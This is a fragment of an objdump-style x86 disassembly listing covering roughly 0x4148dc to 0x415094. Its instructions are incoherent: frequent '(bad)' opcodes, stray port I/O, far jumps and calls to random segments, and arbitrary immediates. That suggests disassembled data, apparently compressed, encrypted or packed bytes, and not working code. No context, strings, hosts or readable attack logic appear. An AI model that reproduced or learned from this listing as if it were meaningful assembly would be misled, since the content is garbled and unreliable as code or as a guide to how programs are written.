  4148dc:	adc    eax,edx
  4148de:	pop    edx
  4148df:	push   esi
  4148e0:	lock cwde 
  4148e2:	sbb    al,0xa1
  4148e4:	(bad)  
  4148e5:	out    0x4d,al
  4148e7:	das    
  4148e8:	jb     0x41493c
  4148ea:	sbb    ecx,DWORD PTR [ebp+0x11ef30da]
  4148f0:	sub    al,0x76
  4148f2:	xor    DWORD PTR [ebx+0x2e5b43b0],0x7daaf83d
  4148fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148fd:	xor    BYTE PTR [esp+ebp*2+0x79ca55b5],ah
  414904:	div    BYTE PTR [ebx]
  414906:	repnz aas 
  414908:	add    edx,esi
  41490a:	cwde   
  41490b:	fwait
  41490c:	ds retf 0xeea2
  414910:	cdq    
  414911:	pop    es
  414912:	jle    0x41489c
  414914:	xchg   edi,eax
  414915:	mov    eax,ds:0x99364891
  41491a:	xlat   BYTE PTR ds:[ebx]
  41491b:	fcmovnb st,st(6)
  41491d:	fisttp DWORD PTR [eax]
  41491f:	dec    edx
  414920:	fdiv   st,st(0)
  414922:	mov    eax,ds:0x5d42c53d
  414927:	shl    BYTE PTR [esi+0x2cdb0509],0x15
  41492e:	adc    BYTE PTR [ebx+0x40],0xf3
  414932:	mov    dl,BYTE PTR [edx+0x6f390ee3]
  414938:	mov    ebp,0xaf55d456
  41493d:	dec    ebp
  41493e:	out    dx,al
  41493f:	sub    al,0xc1
  414941:	outs   dx,DWORD PTR ds:[esi]
  414942:	pusha  
  414943:	or     DWORD PTR [ecx-0x63],edi
  414946:	inc    ebx
  414947:	loope  0x4149a1
  414949:	mov    WORD PTR [ebp+0x5abf8010],cs
  41494f:	mov    eax,0xd17ca63
  414954:	cdq    
  414955:	xor    edx,DWORD PTR [eax]
  414957:	xor    eax,0x68ab0692
  41495c:	out    0x94,al
  41495e:	xor    dl,BYTE PTR ds:0x50e127cf
  414964:	push   es
  414965:	mov    ebp,0xaf935324
  41496a:	push   0xfffffff3
  41496c:	jb     0x414953
  41496e:	xor    bh,BYTE PTR [esi-0x4ba9538d]
  414974:	cmp    bl,ch
  414976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414977:	pop    edi
  414978:	add    BYTE PTR [eax+ebx*2-0x5256aa88],0x99
  414980:	lods   al,BYTE PTR ds:[esi]
  414981:	pop    ebp
  414982:	ficom  WORD PTR [ebp-0x2cbdf86e]
  414988:	cli    
  414989:	imul   edi,DWORD PTR [edx+0x4f9386e0],0x6c04ce5e
  414993:	cmp    DWORD PTR [edx+0x77],ecx
  414996:	into   
  414997:	pop    ss
  414998:	mov    cl,0xb7
  41499a:	jbe    0x4149cc
  41499c:	fidiv  WORD PTR [edi-0x1370fac]
  4149a2:	adc    dh,bh
  4149a4:	stos   BYTE PTR es:[edi],al
  4149a5:	ficomp DWORD PTR [esi+0x4c]
  4149a8:	pop    esi
  4149a9:	sbb    eax,0x80ae7a8
  4149ae:	fdiv   QWORD PTR [edi+0x14]
  4149b1:	push   ebx
  4149b2:	sub    al,0x17
  4149b4:	mov    ebp,0x10ae48a0
  4149b9:	mov    bl,0xe0
  4149bb:	js     0x414984
  4149bd:	sar    BYTE PTR [edx],0xa9
  4149c0:	push   edx
  4149c1:	fs cmp ebx,ecx
  4149c4:	repnz dec edx
  4149c6:	mov    ds:0x70b52978,al
  4149cb:	jle    0x4149d0
  4149cd:	mov    WORD PTR [ecx-0xa],ds
  4149d0:	cmp    eax,0xef879ef1
  4149d5:	stos   DWORD PTR es:[edi],eax
  4149d6:	(bad)  
  4149d7:	fld    DWORD PTR [ebp+ecx*4+0x2a222bcb]
  4149de:	jg     0x4149cc
  4149e0:	or     eax,0x94ec3a5f
  4149e5:	or     edx,ecx
  4149e7:	cmp    ebp,DWORD PTR ds:[eax+0x14e1ef2d]
  4149ee:	fistp  QWORD PTR [edi+0xd]
  4149f1:	mov    bl,0x63
  4149f3:	pop    edx
  4149f4:	ins    BYTE PTR es:[edi],dx
  4149f5:	or     ebx,ecx
  4149f7:	ficom  WORD PTR [eax]
  4149f9:	jmp    0x2e44:0x5437e6b0
  414a00:	jnp    0x4149fc
  414a02:	test   BYTE PTR fs:[ebx+0x13],bl
  414a06:	jbe    0x414a62
  414a08:	push   eax
  414a09:	inc    edi
  414a0a:	retf   
  414a0b:	add    BYTE PTR [edi-0x21],0x8c
  414a0f:	into   
  414a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a11:	inc    ebp
  414a12:	push   ecx
  414a13:	cmp    BYTE PTR [ebp+0x4cc51482],dl
  414a19:	mov    al,0x4f
  414a1b:	or     DWORD PTR [ebx+0x55],esp
  414a1e:	xor    edx,DWORD PTR [ebx+0x22]
  414a21:	adc    al,0x63
  414a23:	dec    edi
  414a24:	bound  eax,QWORD PTR fs:[ecx-0x4a]
  414a28:	adc    BYTE PTR [edi+0x62b74a0],ch
  414a2e:	push   edx
  414a2f:	mov    ds:0xfda16749,al
  414a34:	enter  0x7999,0x4
  414a38:	adc    al,0x24
  414a3a:	pushf  
  414a3b:	sbb    bh,dh
  414a3d:	and    eax,0x81afb1aa
  414a42:	jg     0x4149ee
  414a44:	mov    dl,0x53
  414a46:	in     eax,dx
  414a47:	jno    0x4149e9
  414a49:	in     al,dx
  414a4a:	rcl    BYTE PTR [eax-0x16],1
  414a4d:	push   0x14
  414a4f:	xor    ch,bh
  414a51:	sub    dh,BYTE PTR [ecx]
  414a53:	and    BYTE PTR [esi-0x10c2f7c0],cl
  414a59:	sti    
  414a5a:	mov    es,WORD PTR [edi]
  414a5c:	in     al,dx
  414a5d:	aas    
  414a5e:	pop    edx
  414a5f:	pop    eax
  414a60:	xchg   ecx,eax
  414a61:	or     eax,0x2ad3bb81
  414a66:	xor    al,BYTE PTR [edi+esi*1]
  414a69:	sbb    bl,ah
  414a6b:	adc    ecx,DWORD PTR [eax-0x2cfc1177]
  414a71:	ss aaa 
  414a73:	xchg   ebp,eax
  414a74:	jmp    0xf22ee313
  414a79:	dec    ebx
  414a7a:	cld    
  414a7b:	js     0x414a15
  414a7d:	adc    al,0xf3
  414a7f:	stos   DWORD PTR es:[edi],eax
  414a80:	push   edx
  414a81:	xor    eax,0x6078eefc
  414a86:	data16 fwait
  414a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a89:	ror    BYTE PTR [ebx+0x65],cl
  414a8c:	out    0xd7,eax
  414a8e:	push   esp
  414a8f:	cli    
  414a90:	out    dx,al
  414a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a92:	xlat   BYTE PTR ds:[ebx]
  414a93:	jno    0x414af9
  414a95:	das    
  414a96:	xchg   ebp,eax
  414a97:	sti    
  414a98:	cdq    
  414a99:	cmc    
  414a9a:	or     eax,ecx
  414a9c:	outs   dx,BYTE PTR ds:[esi]
  414a9d:	sub    BYTE PTR [edx],ch
  414a9f:	mov    BYTE PTR [eax],0x64
  414aa2:	cld    
  414aa3:	mov    ds:0xe900de2d,eax
  414aa8:	clc    
  414aa9:	(bad)  
  414aaa:	lods   eax,DWORD PTR ds:[esi]
  414aab:	sub    eax,0x266be568
  414ab0:	or     BYTE PTR [ecx-0x6cc6b21b],cl
  414ab6:	or     edi,edx
  414ab8:	gs ins BYTE PTR es:[edi],dx
  414aba:	push   ebx
  414abb:	xchg   esp,eax
  414abc:	aaa    
  414abd:	or     al,0xa3
  414abf:	(bad)  
  414ac1:	cli    
  414ac2:	xor    cl,cl
  414ac4:	hlt    
  414ac5:	dec    ebp
  414ac6:	nop
  414ac7:	push   0x40
  414ac9:	inc    esi
  414aca:	sub    al,0x99
  414acc:	aas    
  414acd:	clc    
  414ace:	dec    ebp
  414acf:	lds    edx,FWORD PTR [edx+edx*2-0xbe81b64]
  414ad6:	or     DWORD PTR [ebx-0x3b],esp
  414ad9:	test   BYTE PTR [edi],al
  414adb:	mov    edi,0x71b376a6
  414ae0:	retf   0x77a2
  414ae3:	mov    eax,ds:0xe89c47a0
  414ae8:	inc    edx
  414ae9:	sub    edi,esi
  414aeb:	outs   dx,BYTE PTR ds:[esi]
  414aec:	add    eax,0x42c25f94
  414af1:	(bad)  
  414af2:	mov    bl,0x8a
  414af4:	inc    eax
  414af5:	cmp    al,0xd9
  414af7:	mov    ebx,DWORD PTR [esp+eiz*8]
  414afa:	add    bl,ah
  414afc:	cmp    eax,0x8ecb7e3f
  414b01:	push   edi
  414b02:	scas   eax,DWORD PTR es:[edi]
  414b03:	mov    dl,0x99
  414b05:	test   BYTE PTR [esi+edx*2],0xc2
  414b09:	shl    al,cl
  414b0b:	test   DWORD PTR [ebx],ebx
  414b0d:	mov    al,0x66
  414b0f:	fcom   QWORD PTR [ebx+0x2b03c1c3]
  414b15:	push   0x8ec77e88
  414b1a:	mov    dh,0x8a
  414b1c:	push   ss
  414b1d:	add    ecx,edx
  414b1f:	mov    ds:0x443a8067,al
  414b24:	enter  0xe9b8,0xe6
  414b28:	cmp    eax,0xe837ca3f
  414b2d:	adc    BYTE PTR [ebp+0xcb195db],cl
  414b33:	mov    bl,0x4d
  414b35:	out    dx,al
  414b36:	and    esp,DWORD PTR [eax+0x26]
  414b39:	xor    DWORD PTR [eax],ecx
  414b3b:	jp     0x414b5f
  414b3d:	cmp    al,0xb3
  414b3f:	jge    0x414b31
  414b41:	xchg   ecx,eax
  414b42:	ret    
  414b43:	dec    ecx
  414b44:	daa    
  414b45:	sar    DWORD PTR [esi-0x77],0xd2
  414b49:	sbb    dl,ch
  414b4b:	addr16 add al,0x6f
  414b4e:	dec    esp
  414b4f:	icebp  
  414b50:	or     eax,0x2617f88b
  414b55:	stos   BYTE PTR es:[edi],al
  414b56:	cmp    eax,0x52320d9a
  414b5b:	adc    BYTE PTR [esi+ebp*8-0x3bdde721],ch
  414b62:	jb     0x414b5a
  414b64:	pop    ebp
  414b65:	push   ss
  414b66:	sub    eax,0x7fc4bcab
  414b6b:	and    eax,0x2281171d
  414b70:	loope  0x414b30
  414b72:	fwait
  414b73:	pop    esp
  414b74:	std    
  414b75:	leave  
  414b76:	cmc    
  414b77:	les    esp,FWORD PTR [eax-0x7078a3af]
  414b7d:	data16 cmp bl,BYTE PTR [bx+si+0x488f]
  414b83:	les    ecx,FWORD PTR [edi-0x61d21c74]
  414b89:	dec    ebx
  414b8a:	fidiv  WORD PTR [eax]
  414b8c:	mov    edx,0x1df58775
  414b91:	cmp    dl,BYTE PTR [edx+0x6]
  414b94:	cld    
  414b95:	dec    edx
  414b96:	(bad)  
  414b97:	xor    al,0x8b
  414b99:	mov    esp,0x1feda2e0
  414b9e:	cdq    
  414b9f:	or     ebp,edi
  414ba1:	aam    0xf4
  414ba3:	adc    ecx,DWORD PTR [esi-0x41]
  414ba6:	mov    edi,0x435248f0
  414bab:	sub    ebx,DWORD PTR [ebp+0xe4ebf09]
  414bb1:	cmp    bh,BYTE PTR [eax+edi*8+0x4e]
  414bb5:	out    dx,al
  414bb6:	cmp    bh,cl
  414bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bb9:	sbb    ebx,eax
  414bbb:	in     al,dx
  414bbc:	in     al,0x4f
  414bbe:	iret   
  414bbf:	jae    0x414c20
  414bc1:	mov    edx,0xe6d28360
  414bc6:	js     0x414ba2
  414bc8:	mov    edx,DWORD PTR [ebx+0x484cad72]
  414bce:	call   0xf77ab308
  414bd3:	fidiv  DWORD PTR [edx+0x39]
  414bd6:	repnz mov edi,0xe8cf3ea5
  414bdc:	adc    eax,0xaa17d1d3
  414be1:	pop    eax
  414be2:	into   
  414be3:	push   eax
  414be4:	dec    eax
  414be5:	(bad)  
  414be7:	test   DWORD PTR [ecx],ecx
  414be9:	les    eax,FWORD PTR es:[esp+ebp*8-0x71a8402f]
  414bf1:	out    0x72,eax
  414bf3:	leave  
  414bf4:	cli    
  414bf5:	jne    0x414c40
  414bf7:	jp     0x414bb6
  414bf9:	mov    ds:0xc631870a,al
  414bfe:	pushf  
  414bff:	pop    es
  414c00:	inc    ebp
  414c01:	jecxz  0x414c60
  414c03:	mov    DWORD PTR [edi+0x59],ebx
  414c06:	ret    
  414c07:	fistp  WORD PTR [ebx+0x1d3cfe6b]
  414c0d:	pop    eax
  414c0e:	xor    BYTE PTR [esi+eiz*4-0x65],al
  414c12:	add    esp,DWORD PTR [ecx-0x6e]
  414c15:	push   eax
  414c16:	fwait
  414c17:	adc    DWORD PTR [edx-0x2a],esp
  414c1a:	pop    ebx
  414c1b:	mov    ch,BYTE PTR [ebp-0x1c]
  414c1e:	aaa    
  414c1f:	xor    BYTE PTR [edx+0x19],dh
  414c22:	scas   al,BYTE PTR es:[edi]
  414c23:	xchg   ebp,eax
  414c24:	pop    ds
  414c25:	add    bl,bh
  414c27:	push   ebp
  414c28:	shl    BYTE PTR [edi+0x44],0xa7
  414c2c:	xchg   ecx,eax
  414c2d:	xor    al,0xb
  414c2f:	(bad)  
  414c30:	cld    
  414c31:	frstor [ebp-0x67]
  414c34:	inc    esp
  414c35:	in     al,0x1a
  414c37:	jbe    0x414c7c
  414c39:	dec    ebp
  414c3a:	jl     0x414c9a
  414c3c:	aad    0x3d
  414c3e:	fcomp  DWORD PTR [edi+ebp*1-0x6cb857bc]
  414c45:	mov    al,0x82
  414c47:	or     eax,DWORD PTR [ebx-0x601d203e]
  414c4d:	retf   
  414c4e:	adc    BYTE PTR [ecx+0x41178776],bl
  414c54:	jbe    0x414c6f
  414c56:	js     0x414c6d
  414c58:	mov    esp,0x5a95f548
  414c5d:	ficom  DWORD PTR [ebp+0x5c]
  414c60:	das    
  414c61:	add    eax,DWORD PTR [ecx-0xf]
  414c64:	repz push eax
  414c66:	sbb    al,0x49
  414c68:	jp     0x414c9b
  414c6a:	addr16 xor esp,ebp
  414c6d:	mov    ds:0x12e7bf57,al
  414c72:	jb     0x414cee
  414c74:	sbb    ah,ch
  414c76:	ins    DWORD PTR es:[edi],dx
  414c77:	jo     0x414ce8
  414c79:	push   ebp
  414c7a:	call   0xf8c11b44
  414c7f:	inc    ecx
  414c80:	nop
  414c81:	jecxz  0x414c52
  414c83:	mov    bh,0xd6
  414c85:	das    
  414c86:	inc    eax
  414c87:	cmp    eax,ebp
  414c89:	jbe    0x414ca6
  414c8b:	pop    ecx
  414c8c:	xchg   ebx,eax
  414c8d:	not    BYTE PTR [ebx-0x4b3c97f8]
  414c93:	lds    ebp,FWORD PTR [ebx]
  414c95:	rcl    BYTE PTR ds:0xe0cf0174,1
  414c9b:	pop    ss
  414c9c:	xchg   ebp,eax
  414c9d:	lock cwde 
  414c9f:	arpl   WORD PTR [ebx+0x4a],bp
  414ca2:	es pop eax
  414ca4:	pop    eax
  414ca5:	imul   ebp,edi,0xffffffe9
  414ca8:	sar    DWORD PTR [edi+0x6a],1
  414cab:	mov    eax,ds:0xbe01388b
  414cb0:	call   0x5e78406f
  414cb5:	cwde   
  414cb6:	(bad)  
  414cb7:	push   ds
  414cb8:	test   eax,0xce48de0f
  414cbd:	aas    
  414cbe:	and    DWORD PTR [ecx+0x3739d5f8],0xd9e5fb5
  414cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cc9:	mov    al,0x54
  414ccb:	pop    ss
  414ccc:	inc    edx
  414ccd:	lods   eax,DWORD PTR ds:[esi]
  414cce:	sbb    DWORD PTR [eax+edi*4],edi
  414cd1:	scas   eax,DWORD PTR es:[edi]
  414cd2:	cli    
  414cd3:	stos   BYTE PTR es:[edi],al
  414cd4:	sub    BYTE PTR [eax+0x6d],0x98
  414cd8:	test   al,0x27
  414cda:	xchg   esp,eax
  414cdb:	mov    ebx,DWORD PTR [edx]
  414cdd:	(bad)  
  414cdf:	repnz sbb DWORD PTR ds:0x97f3d781,eax
  414ce6:	retf   
  414ce7:	ja     0x414cff
  414ce9:	dec    esi
  414cea:	xor    BYTE PTR [ebx-0x66],ch
  414ced:	jp     0x414ce4
  414cef:	test   al,0xd2
  414cf1:	aaa    
  414cf2:	rcr    BYTE PTR [edi-0x21],1
  414cf5:	pop    eax
  414cf6:	mov    eax,ds:0xc6acf152
  414cfb:	ret    0xedbf
  414cfe:	and    ecx,DWORD PTR [edx]
  414d00:	mov    eax,es
  414d02:	outs   dx,BYTE PTR ds:[esi]
  414d03:	test   al,0x2f
  414d05:	pop    ebp
  414d06:	inc    ebx
  414d07:	test   al,0x78
  414d09:	jns    0x414ce3
  414d0b:	xor    al,0x2b
  414d0d:	dec    edx
  414d0e:	jnp    0x414d60
  414d10:	pop    ss
  414d11:	pop    esp
  414d12:	or     BYTE PTR [eax-0x31cc139],bl
  414d18:	lahf   
  414d19:	pop    ss
  414d1a:	push   edx
  414d1b:	enter  0x2693,0x49
  414d1f:	sub    ecx,DWORD PTR [ecx-0x54]
  414d22:	xchg   ecx,eax
  414d23:	mov    esi,0x8bbbb5c6
  414d28:	sar    DWORD PTR [esp+eax*2+0x44841ff8],1
  414d2f:	sbb    al,0xd
  414d31:	sub    BYTE PTR [edx],dh
  414d33:	in     al,0x4
  414d35:	shl    BYTE PTR [ebx+0xb],0x8e
  414d39:	aaa    
  414d3a:	push   es
  414d3b:	mov    DWORD PTR [ecx+0x4],ebp
  414d3e:	sbb    eax,0x179ef705
  414d43:	or     eax,0xdbfb670f
  414d48:	jle    0x414d79
  414d4a:	sub    eax,0x6977477f
  414d4f:	cmp    DWORD PTR [ebx+0x6d],0xb236ea54
  414d56:	push   eax
  414d57:	clc    
  414d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d59:	sub    BYTE PTR [eax-0x19],dl
  414d5c:	xchg   esp,eax
  414d5d:	clc    
  414d5e:	mov    esi,DWORD PTR ds:0x78e435c0
  414d64:	and    al,0x39
  414d66:	aas    
  414d67:	out    0x8e,al
  414d69:	add    DWORD PTR [esi+ebp*2+0x2ac21bcd],ecx
  414d70:	scas   al,BYTE PTR es:[edi]
  414d71:	ror    dl,1
  414d73:	xchg   esp,eax
  414d74:	pop    ebx
  414d75:	std    
  414d76:	jl     0x414da3
  414d78:	adc    eax,0x4e2b06b7
  414d7d:	mov    DWORD PTR ds:0x19cb35f2,eax
  414d83:	cs sbb eax,ebp
  414d86:	in     eax,dx
  414d87:	pop    ds
  414d88:	clc    
  414d89:	cmp    al,ah
  414d8b:	das    
  414d8c:	or     DWORD PTR [eax-0x13544905],esi
  414d92:	mov    ebp,0xb0e4b5a8
  414d97:	mov    eax,ds:0x78705652
  414d9c:	imul   edx,DWORD PTR [ebx+0x346f214a],0x3a
  414da3:	dec    edx
  414da4:	mov    edi,0x46ce7445
  414da9:	icebp  
  414daa:	mov    ecx,DWORD PTR [edx-0x7422ef]
  414db0:	or     al,0x14
  414db2:	and    al,0xd
  414db4:	nop
  414db5:	test   ecx,ebp
  414db7:	inc    ebx
  414db8:	or     ah,bh
  414dba:	push   ebx
  414dbb:	add    edi,DWORD PTR [eax+esi*4+0x45]
  414dbf:	and    BYTE PTR [edi-0x37],dl
  414dc2:	fldenv [esi+0x4a]
  414dc5:	sub    al,0x8d
  414dc7:	pop    ecx
  414dc8:	cmp    ah,0x52
  414dcb:	xor    eax,0xec87f0a1
  414dd0:	cmp    al,0x46
  414dd2:	jns    0x414d58
  414dd4:	pop    ss
  414dd5:	jmp    DWORD PTR [ecx+0x73]
  414dd8:	inc    edx
  414dd9:	mov    esi,0x9f442cab
  414dde:	adc    dl,BYTE PTR [edx]
  414de0:	fstp   st(0)
  414de2:	outs   dx,DWORD PTR ds:[esi]
  414de3:	in     al,0xe2
  414de5:	push   cs
  414de6:	push   0x38
  414de8:	repz dec esp
  414dea:	lds    esi,FWORD PTR [edx]
  414dec:	add    DWORD PTR [ecx],0xbb300ab1
  414df2:	pop    esp
  414df3:	mov    esi,ebp
  414df5:	ss in  al,0xf7
  414df8:	and    DWORD PTR [ebp-0x17],ebp
  414dfb:	sbb    cl,ah
  414dfd:	cld    
  414dfe:	call   0x8cf9:0x83d1e55e
  414e05:	cmp    edx,DWORD PTR [esi+ebx*2]
  414e08:	ds call 0x10cf:0x1647512f
  414e10:	ficomp WORD PTR [edi+0x30f5012d]
  414e16:	mov    DWORD PTR es:[esi-0x45ec0353],esp
  414e1d:	xlat   BYTE PTR ds:[ebx]
  414e1e:	inc    edx
  414e1f:	cmp    eax,0xf85804f9
  414e24:	jle    0x414dff
  414e26:	add    edi,DWORD PTR [ecx+0x6231c77d]
  414e2c:	aas    
  414e2d:	into   
  414e2e:	push   edi
  414e2f:	pushf  
  414e30:	cmp    BYTE PTR [edx-0x26],ch
  414e33:	(bad)  
  414e34:	out    dx,eax
  414e35:	imul   esi,ebx,0x765bbfac
  414e3b:	aaa    
  414e3c:	mov    ds:0x122e6e8b,eax
  414e41:	or     al,0x60
  414e43:	cld    
  414e44:	mov    dh,0xda
  414e46:	fld    QWORD PTR [ebx+0x3713acdd]
  414e4c:	add    esi,DWORD PTR [edx+0x44a6b257]
  414e52:	in     eax,dx
  414e53:	adc    edi,DWORD PTR [edi+0x760847f6]
  414e59:	xchg   ecx,eax
  414e5a:	adc    BYTE PTR [ecx],ch
  414e5c:	adc    ecx,edi
  414e5e:	inc    ebp
  414e5f:	(bad)  
  414e60:	mov    cl,0x95
  414e62:	pop    esp
  414e63:	cmp    DWORD PTR [edx+0x0],ecx
  414e66:	mov    cl,0x64
  414e68:	mov    al,0x6b
  414e6a:	mov    bh,0x17
  414e6c:	pushf  
  414e6d:	xor    BYTE PTR [ebx+0x7828d29],dl
  414e73:	pop    eax
  414e74:	shl    eax,1
  414e76:	sbb    BYTE PTR [esi+0x18],0x5f
  414e7a:	sub    BYTE PTR [ebp-0x51],bh
  414e7d:	les    esi,FWORD PTR [ecx-0x3e]
  414e80:	xor    DWORD PTR [bx+si-0x6c75],0xffffffe4
  414e86:	jne    0x414e0b
  414e88:	lea    edx,[esi-0x11]
  414e8b:	cmp    esp,DWORD PTR [ebp+0x6e9fea2e]
  414e91:	pop    ebp
  414e92:	dec    esp
  414e93:	(bad)
  414e96:	mov    esi,0x82a1da03
  414e9b:	push   ebp
  414e9c:	aas    
  414e9d:	inc    ecx
  414e9e:	push   edx
  414e9f:	adc    eax,0x166f450f
  414ea4:	retf   
  414ea5:	mov    ebp,0xe33165c7
  414eaa:	neg    DWORD PTR ds:[ebx+eax*8]
  414eae:	addr16 dec esp
  414eb0:	fdivr  st,st(4)
  414eb2:	out    0x9d,eax
  414eb4:	(bad)  
  414eb5:	inc    esi
  414eb6:	dec    eax
  414eb7:	and    al,BYTE PTR [ecx]
  414eb9:	mov    ch,0xe7
  414ebb:	data16 jo 0x414eb6
  414ebe:	out    dx,eax
  414ebf:	out    dx,al
  414ec0:	int    0x89
  414ec2:	in     al,0x2c
  414ec4:	ffree  st(0)
  414ec6:	mov    bh,0x87
  414ec8:	int    0xfa
  414eca:	mov    bl,ch
  414ecc:	mov    edi,0x455e08d8
  414ed1:	outs   dx,BYTE PTR ds:[esi]
  414ed2:	pop    edx
  414ed3:	mov    DWORD PTR [ebp-0x22],edx
  414ed6:	mov    ebp,0x9599e97
  414edb:	mov    ds,edi
  414edd:	push   ds
  414ede:	call   0x6a97:0x71b28b5d
  414ee5:	and    al,0xc4
  414ee7:	xchg   ecx,eax
  414ee8:	sar    ecx,0xb7
  414eeb:	leave  
  414eec:	xchg   ebp,eax
  414eed:	jge    0x414f02
  414eef:	push   edi
  414ef0:	fisttp WORD PTR [esi]
  414ef2:	adc    eax,0x9f47a4ed
  414ef7:	fist   WORD PTR [edx+esi*4]
  414efa:	sbb    cl,dh
  414efc:	jmp    0x7c60:0xd6923af2
  414f03:	xchg   esp,eax
  414f04:	jo     0x414f17
  414f06:	or     ebp,DWORD PTR [edi+0x18]
  414f09:	fisubr WORD PTR [ebp-0x5a46f71d]
  414f0f:	cmp    eax,0x116db9ca
  414f14:	inc    eax
  414f15:	xchg   BYTE PTR [eax+0x15],ch
  414f18:	and    esp,DWORD PTR ds:0x6f70b302
  414f1e:	nop
  414f1f:	and    BYTE PTR [ecx+0x4586781c],ch
  414f25:	into   
  414f26:	xchg   esi,eax
  414f27:	imul   edx,DWORD PTR [ebx-0x5f],0xffffff95
  414f2b:	push   es
  414f2c:	jg     0x414f67
  414f2e:	addr16 and al,0xb9
  414f31:	add    BYTE PTR [esi-0x16],cl
  414f34:	dec    ebx
  414f35:	ja     0x414ec9
  414f37:	mov    bh,BYTE PTR [eax]
  414f39:	xchg   ebx,eax
  414f3a:	xor    bl,0x29
  414f3d:	xchg   ebp,eax
  414f3e:	outs   dx,DWORD PTR ds:[esi]
  414f3f:	nop
  414f40:	scas   al,BYTE PTR es:[edi]
  414f41:	mov    bh,0x11
  414f43:	or     al,0xfb
  414f46:	mov    cl,0x4d
  414f48:	dec    ecx
  414f49:	out    dx,al
  414f4a:	and    eax,0xf84a9f1d
  414f4f:	jbe    0x414f87
  414f51:	cdq    
  414f52:	cmp    ah,BYTE PTR [ebx-0x74]
  414f55:	in     al,dx
  414f56:	aad    0x78
  414f58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f59:	adc    DWORD PTR [ebx],esp
  414f5b:	fnstenv [esi]
  414f5d:	and    ecx,DWORD PTR gs:[eax]
  414f60:	mov    edi,0x80147c9e
  414f65:	jne    0x414fb3
  414f67:	pop    ebx
  414f68:	add    BYTE PTR [edx+0x7fc57763],al
  414f6e:	int3   
  414f6f:	(bad)  
  414f70:	into   
  414f71:	cmp    ecx,DWORD PTR [ebx+0x4d]
  414f74:	cmp    dh,BYTE PTR [ecx+0x5e849794]
  414f7a:	or     bl,BYTE PTR [ecx]
  414f7c:	daa    
  414f7d:	add    DWORD PTR [edi+eiz*8+0x7e],eax
  414f81:	sti    
  414f82:	mov    BYTE PTR [edi],bh
  414f84:	lods   eax,DWORD PTR ds:[esi]
  414f85:	shl    DWORD PTR [eax+0x50777680],0x5a
  414f8c:	pop    edx
  414f8d:	jle    0x414fa2
  414f8f:	hlt    
  414f90:	dec    ebp
  414f91:	test   BYTE PTR [ebp+0x15f60dfb],bh
  414f97:	xlat   BYTE PTR ds:[ebx]
  414f98:	cdq    
  414f99:	mov    cl,0xa
  414f9b:	mov    cl,0x9e
  414f9d:	inc    ecx
  414f9e:	sub    al,0x46
  414fa0:	test   edi,ecx
  414fa2:	int3   
  414fa3:	scas   al,BYTE PTR es:[edi]
  414fa4:	lock jmp 0x7e72b8b0
  414faa:	xor    ebp,DWORD PTR [ebp-0x91456fa]
  414fb0:	xor    ebp,DWORD PTR [ecx+0x61bd005e]
  414fb6:	sar    DWORD PTR [edi],0x88
  414fb9:	in     al,dx
  414fba:	out    dx,eax
  414fbb:	xchg   ch,ch
  414fbd:	dec    esp
  414fbf:	jp     0x415039
  414fc1:	pop    esi
  414fc2:	(bad)  
  414fc3:	mov    BYTE PTR [edx+0x62db83b3],ah
  414fc9:	pop    ds
  414fca:	mov    edi,0x14e9cea3
  414fcf:	adc    edx,edx
  414fd1:	in     eax,dx
  414fd2:	shl    DWORD PTR [ebx-0x3e],1
  414fd5:	mov    bl,0x17
  414fd7:	mov    al,ds:0xdfd89fa1
  414fdc:	adc    al,0x70
  414fde:	(bad)  
  414fdf:	mov    edi,0x55f359d0
  414fe4:	loope  0x414fe4
  414fe6:	loop   0x41501c
  414fe8:	leave  
  414fe9:	add    al,al
  414feb:	jno    0x414fe5
  414fed:	xchg   edx,eax
  414fee:	mov    bh,0x6d
  414ff0:	or     eax,0xce9bf04f
  414ff5:	pusha  
  414ff6:	push   esi
  414ff7:	adc    ah,BYTE PTR ds:0x6fc981b6
  414ffd:	lahf   
  414ffe:	jo     0x415054
  415000:	enter  0xafe3,0x0
  415004:	and    al,0x50
  415006:	pop    es
  415007:	imul   esp,DWORD PTR [ecx-0x4e35c088],0xffffff8d
  41500e:	mov    esp,0x93249146
  415013:	ds jae 0x414fe3
  415016:	out    0x59,eax
  415018:	mul    DWORD PTR [esp+ebp*1]
  41501b:	fsubr  st(4),st
  41501d:	out    dx,eax
  41501e:	fidivr WORD PTR [eax]
  415020:	mov    ah,dh
  415022:	imul   ebp,DWORD PTR [esi-0x6008a7b2],0x6cedca3a
  41502c:	add    DWORD PTR [esi],edx
  41502e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41502f:	out    0xde,al
  415031:	xchg   DWORD PTR [edi-0x71],esp
  415034:	int    0xb8
  415036:	test   al,0xbb
  415038:	sub    ebx,edi
  41503a:	push   edi
  41503b:	fsub   QWORD PTR [esi+esi*1]
  41503e:	sub    edi,DWORD PTR [edi-0x5e]
  415041:	adc    ecx,DWORD PTR [esi+0x19406da3]
  415047:	add    DWORD PTR [esi-0x679d0d9e],ebx
  41504d:	xchg   ecx,eax
  41504e:	xchg   esi,eax
  41504f:	push   esi
  415050:	inc    eax
  415051:	pop    ecx
  415052:	lds    edx,FWORD PTR [edi]
  415054:	cmp    BYTE PTR [ebx-0x14a56bc],0xf7
  41505b:	cmp    dl,BYTE PTR [edx]
  41505d:	push   0x48
  41505f:	push   ds
  415060:	mov    ebx,0x2a7695e7
  415065:	dec    edx
  415066:	fsubr  DWORD PTR [esi-0x43ddef62]
  41506c:	ds in  eax,dx
  41506e:	imul   ebx,ebx,0x1f6df56c
  415074:	sub    BYTE PTR [edx],dl
  415076:	cmp    edx,DWORD PTR [edi+0x10]
  415079:	xchg   edi,eax
  41507a:	push   edx
  41507b:	mov    al,0x40
  41507d:	jbe    0x41500f
  41507f:	es pop ss
  415081:	sar    DWORD PTR [ecx],cl
  415083:	xchg   ecx,eax
  415084:	pushf  
  415085:	xor    edi,DWORD PTR [ecx+0xb]
  415088:	mov    ebx,0x48a2a35b
  41508d:	dec    esp
  41508e:	nop
  41508f:	call   0x50913270
  415094:	jno    0x41505d
